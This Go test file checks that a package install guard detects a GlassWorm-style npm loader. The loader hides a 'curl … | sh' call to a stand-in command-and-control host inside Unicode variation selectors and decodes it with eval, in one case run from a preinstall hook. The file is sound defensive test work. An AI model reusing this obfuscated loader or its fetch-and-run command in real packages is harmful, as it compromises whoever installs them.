package cli

// Attack 2026 #06 — GlassWorm March wave, npm leg, through the install
// guard's offline byte analysis (analyzeArtifact, called from
// guard_eval.go when guardArtifactBytes finds the package's bytes: a staged
// CHAINSAW_GUARD_ARTIFACT_DIR, npm/cargo/pip caches, or CHAINSAW_GUARD_DEEP=1).
// Same scanner + benign-context suppression the server provider uses.

import (
	"strings"
	"testing"
)

func attack06Encode(payload string) string {
	var b strings.Builder
	for _, c := range []byte(payload) {
		if c < 16 {
			b.WriteRune(rune(0xFE00 + int(c)))
		} else {
			b.WriteRune(rune(0xE0100 + int(c) - 16))
		}
	}
	return b.String()
}

func attack06Loader() string {
	hidden := attack06Encode(`require("child_process").exec("curl -s https://c2.example.invalid/s|sh")`)
	return "const s = v => [...v].map(w => (w = w.codePointAt(0), w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 : w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null)).filter(n => n !== null);\n" +
		"eval(Buffer.from(s(`" + hidden + "`)).toString('utf-8'));\n"
}

func TestAttack2026_06_GlassWormGuard(t *testing.T) {
	t.Run("attack: decoder in index.js (no install hook)", func(t *testing.T) {
		v := analyzeArtifact("npm", makeTGZ(t, map[string]string{
			"package/package.json": `{"name":"@aifabrix/miso-client","version":"4.7.2","main":"index.js"}`,
			"package/index.js":     attack06Loader() + "module.exports = {};\n",
		}))
		if !v.Block || !strings.Contains(v.Reason, "variation selector") {
			t.Fatalf("want BLOCK on variation-selector run, got %+v", v)
		}
	})

	t.Run("attack: same loader behind a preinstall hook", func(t *testing.T) {
		v := analyzeArtifact("npm", makeTGZ(t, map[string]string{
			"package/package.json":  `{"name":"@iflow-mcp/watercrawl-watercrawl-mcp","version":"1.3.1","scripts":{"preinstall":"node preinstall.js"}}`,
			"package/preinstall.js": attack06Loader(),
		}))
		if !v.Block {
			t.Fatalf("want BLOCK for preinstall GlassWorm loader, got %+v", v)
		}
		t.Logf("preinstall verdict: %s", v.Reason)
	})

	t.Run("control: emoji and a decoder-free package", func(t *testing.T) {
		v := analyzeArtifact("npm", makeTGZ(t, map[string]string{
			"package/package.json": `{"name":"emoji-ok","version":"1.0.0","main":"index.js"}`,
			"package/index.js":     "module.exports = '✅ done ❤️ keycap 1️⃣';\n",
			"package/README.md":    "Status ❤️ ✔️\n",
		}))
		if v.Block {
			t.Fatalf("benign emoji package blocked: %+v", v)
		}
	})
}
